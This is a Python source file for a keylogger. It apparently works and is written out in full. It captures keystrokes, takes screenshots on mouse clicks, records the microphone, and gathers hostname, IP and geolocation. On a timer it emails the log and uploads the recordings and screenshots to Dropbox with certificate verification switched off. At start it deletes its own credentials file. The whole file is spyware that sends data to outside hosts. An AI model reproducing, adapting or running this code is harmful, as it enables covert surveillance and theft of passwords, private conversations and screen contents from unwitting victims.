from pynput import keyboard, mouse
from requests.adapters import HTTPAdapter
import dropbox
import geocoder
import os
import platform
import pyscreenshot
import socket
import sounddevice as sd
import ssl
import time
import wave

from utils import (
    send_mail_with_attachment,
    get_wav_and_png_files,
    delete_wav_and_png_files,
    remove_env_file,
    upload_to_dropbox,
)


class SSLAdapter(HTTPAdapter):
    # Avoid SSL certificate verification
    def init_poolmanager(self, *args, **kwargs):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        kwargs["ssl_context"] = context
        return super(SSLAdapter, self).init_poolmanager(*args, **kwargs)


class KeyLogger:
    def __init__(
        self,
        time_interval,
        smtp_server,
        smtp_port,
        email_address,
        email_password,
        email_sender,
        email_receiver,
        cc,
        magic_word,
        dropbox_token,
    ):
        self.interval = time_interval
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.email_address = email_address
        self.email_password = email_password
        self.email_sender = email_sender
        self.email_receiver = email_receiver
        self.dropbox_token = dropbox_token
        self.cc = cc
        self.magic_word = magic_word
        self.log = "KeyLogger Started...\n"
        self.keyboard_listener = None
        self.mouse_listener = None
        self.word = ""

    def appendlog(self, string):
        if string:
            self.log = self.log + string

    def on_move(self, x, y):
        # current_move = f"\nMouse moved to {x} {y}"
        # self.appendlog(current_move)
        pass  # do nothing

    def on_scroll(self, x, y, dx, dy):
        # current_scroll = f"\nMouse scrolled at {x} {y} with scroll distance {dx} {dy}"
        # self.appendlog(current_scroll)
        pass  # do nothing

    def on_click(self, x, y, button, pressed):
        current_click = f"\nMouse click at {x} {y} with button {button}"
        self.screenshot()
        self.appendlog(current_click)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = f" {str(key)} "

        self.word = self.word + current_key
        self.appendlog(f"\nPressed key: {current_key}")

    def send_mail(self, message):
        send_mail_with_attachment(
            smtp_server=self.smtp_server,
            smtp_port=self.smtp_port,
            email_address=self.email_address,
            email_password=self.email_password,
            email_sender=self.email_sender,
            email_receiver=self.email_receiver,
            cc=self.cc,
            path_to_attachment=os.getcwd(),
            attachments=[],
            subject="Test KeyLogger - by F3000",
            body=message,
        )

    def report(self):
        self.send_mail(f"{self.log}")
        wav_and_png_files = get_wav_and_png_files()

        dbx = dropbox.Dropbox(self.dropbox_token)
        session = dbx._session
        session.mount("https://", SSLAdapter())

        upload_to_dropbox(socket.gethostname(), dbx, wav_and_png_files)

        delete_wav_and_png_files()

        print(self.log)

    def cleanup(self):
        self.log = ""
        if self.keyboard_listener and self.keyboard_listener.running:
            self.keyboard_listener.stop()
        if self.mouse_listener and self.mouse_listener.running:
            self.mouse_listener.stop()
        self.word = ""

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        processor = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog("System info:")
        self.appendlog(f"\nHostname = {hostname}")
        self.appendlog(f"\nIP = {ip}")
        self.appendlog(f"\nProcessor = {processor}")
        self.appendlog(f"\nSystem OS = {system}")
        self.appendlog(f"\nMachine architecture = {machine}")
        self.appendlog("\n\n\n")

    def get_location(self):
        location = geocoder.ip("me")

        self.appendlog("\nLocation info:")

        if location.ok:
            latitude, longitude = location.latlng
            city = location.city
            state = location.state
            country = location.country

            self.appendlog(f"\nGeo position = {latitude} {longitude}")
            self.appendlog(f"\nCity = {city}")
            self.appendlog(f"\nState = {state}")
            self.appendlog(f"\nCountry = {country}")
        else:
            self.appendlog("\nLocation not determined.")

    def microphone(self):
        fs = 44100
        channels = 1  # mono
        seconds = self.interval
        obj = wave.open(f"sound_{time.time()}.wav", "w")
        obj.setnchannels(channels)  # mono
        obj.setsampwidth(2)  # Sampling of 16 bit
        obj.setframerate(fs)
        myrecording = sd.rec(
            int(seconds * fs), samplerate=fs, channels=channels, dtype="int16"
        )
        sd.wait()
        obj.writeframesraw(myrecording)
        self.appendlog("\nmicrophone used.")

    def screenshot(self):
        img = pyscreenshot.grab()
        img.save(f"screenshot_{time.time()}.png")
        self.appendlog("\nscreenshot used.")

    def run(self):
        remove_env_file()

        while True:
            self.system_information()
            self.get_location()

            self.keyboard_listener = keyboard.Listener(on_press=self.save_data)
            self.keyboard_listener.start()

            self.mouse_listener = mouse.Listener(
                on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll
            )
            self.mouse_listener.start()

            # self.screenshot()
            self.microphone()

            time.sleep(self.interval)

            self.report()

            if self.magic_word != "" and self.magic_word in self.word:
                break

            self.cleanup()  # this cleanup is used until the while loop works
        self.cleanup()  # this cleanup is used when the while loop stops
